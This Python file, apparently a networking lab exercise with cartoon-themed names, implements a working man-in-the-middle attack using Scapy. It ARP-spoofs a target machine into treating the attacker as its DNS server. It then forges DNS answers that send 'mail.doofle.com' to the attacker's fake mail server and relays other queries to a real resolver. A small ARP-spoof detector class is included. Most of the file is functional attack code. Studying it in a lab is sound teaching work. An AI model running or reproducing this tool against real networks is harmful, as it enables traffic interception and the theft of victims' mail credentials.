from typing import Dict, List
import multiprocessing as mp
from scapy.layers.l2 import getmacbyip, Ether, ARP
from scapy.layers.dns import DNS, DNSQR, DNSRR, IP, sr1, UDP
import scapy.all as scapy
import time

DOOFENSHMIRTZ_IP = "10.0.2.15"  # Enter the computer you attack's IP.
SECRATERY_IP = "10.0.2.16"  # Enter the attacker's IP.
NETWORK_DNS_SERVER_IP = "10.0.2.43"  # Enter the network's DNS server's IP.
SPOOF_SLEEP_TIME = 2

IFACE = "eth0"  # Enter the network interface you work on.
ARP_FILTER = "arp"
NETWORK_SCAN_CIDR = "10.0.2.0/24"

FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
REAL_DNS_SERVER_IP = "8.8.8.8"  # The server we use to get real DNS responses.
SPOOF_DICT = {  # This dictionary tells us which host names our DNS server needs to fake, and which ips should it give.
    b"mail.doofle.com.": FAKE_GMAIL_IP
}


class ArpSpoofer(object):
    """
    An ARP Spoofing process. Sends periodical ARP responses to given target
    in order to convince it we are a specific ip (e.g: default gateway).
    """

    def __init__(self,
                 process_list: List[mp.Process],
                 target_ip: str, spoof_ip: str) -> None:
        """
        Initializer for the arp spoofer process.
        @param process_list global list of processes to append our process to.
        @param target_ip ip to spoof
        @param spoof_ip ip we want to convince the target we have.
        """
        process_list.append(self)
        self.process = None

        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.target_mac = None
        self.spoof_count = 0

    def get_target_mac(self) -> str:
        """
        Returns the mac address of the target.
        If not initialized yet, sends an ARP request to the target and waits for a response.
        @return the mac address of the target.
        """
        if self.target_mac is None:
            self.target_mac = getmacbyip(self.target_ip)
        return self.target_mac
    

    def spoof(self) -> None:
        """
        Sends an ARP spoof that convinces target_ip that we are spoof_ip.
        Increases spoof count b by one.
        """       
        self.get_target_mac() 
        my_mac = scapy.get_if_hwaddr(IFACE)
        pkt = (
            Ether(dst=self.target_mac, src=my_mac)
            /
            ARP(
                op=2,
                hwsrc=my_mac,
                psrc=self.spoof_ip,  
                hwdst=self.target_mac,      
                pdst=self.target_ip,       
            )
        )
        scapy.sendp(pkt, iface=IFACE, verbose=False)
        self.spoof_count += 1

    def run(self) -> None:
        """
        Main loop of the process.
        """
        while True:
            self.spoof()
            time.sleep(SPOOF_SLEEP_TIME)

    def start(self) -> None:
        """
        Starts the ARP spoof process.
        """
        p = mp.Process(target=self.run)
        self.process = p
        self.process.start()


class ArpSpoofDetector(object):
    def __init__(self, process_list: List[mp.Process]) -> None:
        process_list.append(self)
        self.process = None
        self.ip_to_mac: Dict[str, str] = {}

    def find_ips_by_mac(self, target_mac: str) -> List[str]:
        """
        Uses a Scapy ARP scan to find real IPs that answer with target_mac.
        """
        request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=NETWORK_SCAN_CIDR)
        answered, _ = scapy.srp(request, timeout=2, iface=IFACE, verbose=False)

        ips = []
        for _, response in answered:
            if response[ARP].hwsrc.lower() == target_mac.lower():
                ips.append(response[ARP].psrc)

        return sorted(set(ips))

    def inspect_packet(self, pkt: scapy.packet.Packet) -> None:
        if ARP not in pkt:
            return
        ip = pkt[ARP].psrc
        mac = pkt[ARP].hwsrc
        if not ip or not mac or ip == "0.0.0.0":
            return

        mac = mac.lower()
        old_mac = self.ip_to_mac.get(ip)

        if old_mac is None:
            self.ip_to_mac[ip] = mac

        elif old_mac != mac:
            possible_attacker_ips = self.find_ips_by_mac(mac)
            attacker_hint = "unknown"
            if possible_attacker_ips:
                attacker_hint = ", ".join(
                    attacker_ip for attacker_ip in possible_attacker_ips
                    if attacker_ip != ip
                )

            if not attacker_hint:
                attacker_hint = ", ".join(possible_attacker_ips)

            print(
                f"[ARP detector] Suspicious ARP change: {ip} was {old_mac}, "
                f"now {mac}. Possible attacker IP: {attacker_hint}"
            )
            self.ip_to_mac[ip] = mac

    def run(self) -> None:
        """
        Main loop of the detector process.
        """
        while True:
            try:
                scapy.sniff(filter=ARP_FILTER, iface=IFACE, prn=self.inspect_packet)
            except:
                import traceback
                traceback.print_exc()

    def start(self) -> None:
        """
        Starts the ARP spoof detector process.
        """
        p = mp.Process(target=self.run)
        self.process = p
        self.process.start()


class DnsHandler(object):
    """
    A DNS request server process. Forwards some of the DNS requests to the
    default servers. However for specific domains this handler returns fake crafted
    DNS responses.
    """

    def __init__(self,
                 process_list: List[mp.Process],
                 spoof_dict: Dict[str, str]):
        """
        Initializer for the dns server process.
        @param process_list global list of processes to append our process to.
        @param spoof_dict dictionary of spoofs.
            The keys: represent the domains we wish to fake,
            The values: represent the fake responses we want
                        from the domains.
        """
        process_list.append(self)
        self.process = None

        self.spoof_dict = spoof_dict
        self.real_dns_server_ip = REAL_DNS_SERVER_IP

    def get_real_dns_response(self, pkt: scapy.packet.Packet) -> scapy.packet.Packet:
        """
        Returns the real DNS response to the given DNS request.
        Asks the default DNS servers (8.8.8.8) and forwards the response, only modifying
        the IP (change it to local IP).

        @param pkt DNS request from target.
        @return DNS response to pkt, source IP changed.
        """
        client_ip = pkt[IP].src
        client_port = pkt[UDP].sport

        original_dns_ip = pkt[IP].dst
        original_dns_port = pkt[UDP].dport

        real_query = (
            IP(dst=REAL_DNS_SERVER_IP)
            / UDP(sport=client_port, dport=53)
            / DNS(
                id=pkt[DNS].id,
                rd=1,
                qd=pkt[DNS].qd
            )
        )

        real_response = sr1(real_query, timeout=2, verbose=False)

        if real_response is None or DNS not in real_response:
            return None
        real_response[IP].src = original_dns_ip
        real_response[IP].dst = client_ip
        real_response[UDP].sport = original_dns_port
        real_response[UDP].dport = client_port
        real_response[DNS].id = pkt[DNS].id

        del real_response[IP].len
        del real_response[IP].chksum
        del real_response[UDP].len
        del real_response[UDP].chksum

        return real_response


    def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
        """
        Returns a fake DNS response to the given DNS request.
        Crafts a DNS response leading to the ip adress 'to' (parameter).

        @param pkt DNS request from target.
        @param to ip address to return from the DNS lookup.
        @return fake DNS response to the request.
        """
        client_ip = pkt[IP].src
        client_port = pkt[UDP].sport

        original_dns_ip = pkt[IP].dst
        original_dns_port = pkt[UDP].dport

        spoofed_response = (
            IP(dst=client_ip, src=original_dns_ip)
            / UDP(sport=original_dns_port, dport=client_port)
            / DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNSQR].qname, rdata=to)
            )
        )

        del spoofed_response[IP].len
        del spoofed_response[IP].chksum
        del spoofed_response[UDP].len
        del spoofed_response[UDP].chksum

        return spoofed_response

    def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
        """
        Main handler for DNS requests. Based on the spoof_dict, decides if the packet
        should be forwarded to real dns server or should be treated with a crafted response.
        Calls either get_real_dns_response or get_spoofed_dns_response accordingly.

        @param pkt DNS request from target.
        @return string describing the choice made
        """
        if pkt[DNS].qd.qname in self.spoof_dict:
            to = self.spoof_dict[pkt[DNS].qd.qname]
            spoofed_response = self.get_spoofed_dns_response(pkt, to)
            if spoofed_response is not None:
                scapy.send(spoofed_response, verbose=False)
            return f"Spoofed response for {pkt[DNS].qd.qname.decode()} sent."
        else:
            real_response = self.get_real_dns_response(pkt)
            if real_response is not None:
                scapy.send(real_response, verbose=False)
            return f"Real response for {pkt[DNS].qd.qname.decode()} sent."

    def run(self) -> None:
        """
        Main loop of the process. Sniffs for packets on the interface and sends DNS
        requests to resolve_packet. For every packet which passes the filter, self.resolve_packet
        is called and the return value is printed to the console.
        """
        while True:
            try:
                scapy.sniff(filter=DNS_FILTER, prn=self.resolve_packet)
            except:
                import traceback
                traceback.print_exc()

    def start(self) -> None:
        """
        Starts the DNS server process.
        """
        p = mp.Process(target=self.run)
        self.process = p
        self.process.start()


if __name__ == "__main__":
    plist = []
    spoofer = ArpSpoofer(plist, DOOFENSHMIRTZ_IP, NETWORK_DNS_SERVER_IP)
    detector = ArpSpoofDetector(plist)
    server = DnsHandler(plist, SPOOF_DICT)

    print("Starting sub-processes...")
    server.start()
    detector.start()
    spoofer.start()
